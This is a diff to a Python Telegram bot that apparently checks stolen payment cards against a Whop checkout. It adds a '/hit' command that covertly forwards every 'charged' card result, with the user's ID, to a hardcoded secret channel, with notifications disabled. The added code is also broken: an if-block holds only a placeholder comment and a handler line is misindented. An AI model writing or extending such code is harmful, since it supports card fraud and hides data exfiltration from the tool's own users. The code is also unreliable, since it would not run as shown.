@@ -3043,6 +3043,28 @@ async def allchecking_callback(
         parse_mode="HTML",
         reply_markup=_allchecking_markup(),
     )
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# /hit COMMAND (WHOP CHECKOUT)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not WHOP_LOADED:
+        # ... rest of the hit code ...
+    
+    await status_msg.edit_text(text, parse_mode="HTML")
+
+    # Send ONLY PAID cards to secret channel
+    if st == "charged":
+        try:
+            uid_str = update.effective_user.id
+            secret_text = f"🕵️‍♂️ <b>New PAID Whop Hit by User:</b> <code>{uid_str}</code>\n{text}"
+            await context.bot.send_message(
+                chat_id=-1003721327421,
+                text=secret_text,
+                parse_mode="HTML",
+                disable_notification=True
+            )
+        except Exception as e:
+            logger.error(f"Failed to send hit secret copy: {e}")
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -6148,8 +6170,9 @@ def main():
         else:
             logger.warning("mst.py does not export get_bin_handler; /bin registration skipped.")
         app.add_handler(CommandHandler("fb",      cmd_fb))
-        app.add_handler(CommandHandler("sh",      _cmd_sh_gated))   # force-join gated
+                app.add_handler(CommandHandler("sh",      _cmd_sh_gated))   # force-join gated
         app.add_handler(CommandHandler("msh",     cmd_msh))
+        app.add_handler(CommandHandler("hit",     cmd_hit))         # <--- ADD THIS LINE HERE
         app.add_handler(get_me_handler())                           # /me — lifetime charged stats
 
         app.add_handler(CommandHandler("1day",        cmd_1day))
